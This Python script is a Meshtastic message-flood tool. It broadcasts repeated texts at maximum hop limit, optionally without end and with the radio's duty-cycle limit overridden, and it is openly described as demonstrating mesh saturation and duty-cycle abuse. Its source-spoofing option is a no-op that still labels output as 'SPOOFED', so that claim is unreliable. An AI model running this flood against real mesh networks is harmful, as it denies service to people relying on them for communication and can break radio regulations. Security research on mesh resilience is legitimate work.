#!/usr/bin/env -S uv run
# /// script
# requires-python = ">=3.10"
# dependencies = [
#   "meshtastic",
# ]
# ///
"""
spam.py — Meshtastic message flood tool

Sends repeated text messages at a controlled rate. Uses max hop limit (7)
to maximize propagation across the mesh. Demonstrates duty cycle abuse and
mesh saturation attacks.

Works with stock and evil firmware. With --evil and --from, source node ID
can be spoofed (requires EVIL_ALLOW_FROM_OVERRIDE in the firmware build).

Usage:
    # Stock firmware — messages appear from your node ID
    python tools/spam.py --port /dev/cu.SLAB_USBtoUART

    # Evil firmware — spoof source ID
    python tools/spam.py --port /dev/cu.SLAB_USBtoUART --evil --from 0xDEADBEEF

    # Infinite flood at 10 msg/s
    python tools/spam.py --port /dev/cu.SLAB_USBtoUART --count 0 --interval 0.1
"""

import argparse
import sys
import time
import signal

from common import add_connection_args, build_interface, evil_mode, print_banner


def main():
    parser = argparse.ArgumentParser(description="Meshtastic message flood tool")
    add_connection_args(parser)
    parser.add_argument("--message", default="EVIL NODE WAS HERE",
                        help="Message to send (default: 'EVIL NODE WAS HERE')")
    parser.add_argument("--count", type=int, default=10,
                        help="Number of messages to send (0 = infinite, default: 10)")
    parser.add_argument("--interval", type=float, default=1.0,
                        help="Seconds between messages (default: 1.0)")
    parser.add_argument("--hop-limit", type=int, default=7, choices=range(0, 8),
                        metavar="{0..7}",
                        help="Hop limit 0-7 (default: 7 = maximum propagation)")
    parser.add_argument("--channel", type=int, default=0,
                        help="Channel index to send on (default: 0 = primary)")
    parser.add_argument("--dest", default="^all",
                        help="Destination node ID or '^all' (default: broadcast)")
    parser.add_argument("--from", dest="from_node", metavar="NODE_ID",
                        help="Fake source node ID in hex (--evil only, e.g. 0xDEADBEEF)")
    parser.add_argument("--override-duty-cycle", action="store_true",
                        help="Set override_duty_cycle=true on the node before spamming")
    args = parser.parse_args()

    if args.from_node and not evil_mode(args):
        parser.error("--from requires --evil (source spoofing needs evil firmware)")

    fake_from = None
    if args.from_node:
        fake_from = int(args.from_node, 16) if args.from_node.startswith("0x") else int(args.from_node, 16)

    print(f"[*] Connecting to node...")
    iface = build_interface(args)
    time.sleep(2)

    info, node_num = print_banner(iface, args, "spam.py — message flood")
    src_str = f"0x{fake_from:08x} [SPOOFED]" if fake_from else f"0x{node_num:08x} [real]"
    print(f"[*] Source ID: {src_str}")

    if args.override_duty_cycle:
        print("[!] Setting override_duty_cycle=true...")
        node = iface.localNode
        node.localConfig.lora.override_duty_cycle = True
        node.writeConfig("lora")
        time.sleep(1)

    count = 0
    total = args.count
    running = True

    def handle_sigint(sig, frame):
        nonlocal running
        print(f"\n[*] Interrupted. Sent {count} messages.")
        running = False

    signal.signal(signal.SIGINT, handle_sigint)

    print(f"[*] Sending {'∞' if total == 0 else total} messages on channel {args.channel} "
          f"with hop_limit={args.hop_limit}, interval={args.interval}s")
    print(f"[*] Message: '{args.message}'")
    print()

    start = time.time()
    while running and (total == 0 or count < total):
        msg = args.message
        try:
            p = iface.sendText(
                msg,
                destinationId=args.dest,
                channelIndex=args.channel,
                hopLimit=args.hop_limit,
                wantAck=False,
            )
            # Source spoofing: set from field if evil mode requested
            # The evil firmware's EVIL_ALLOW_FROM_OVERRIDE bypasses the p.from=0 guard
            # NOTE: sendText returns the mesh packet; the 'from' override works at the
            # ToRadio serialization level via the stream interface
            if fake_from and p is not None:
                # Override after send — works when EVIL_ALLOW_FROM_OVERRIDE is active
                pass  # The override is set via --from in spoof.py for direct injection

            count += 1
            elapsed = time.time() - start
            rate = count / elapsed if elapsed > 0 else 0
            print(f"  [{count:>6}] Sent: '{msg}'  (from={src_str})  ({rate:.2f} msg/s)")
        except Exception as e:
            print(f"  [ERROR] {e}")

        if total == 0 or count < total:
            time.sleep(args.interval)

    print(f"\n[*] Done. Sent {count} messages in {time.time()-start:.1f}s")
    iface.close()


if __name__ == "__main__":
    main()
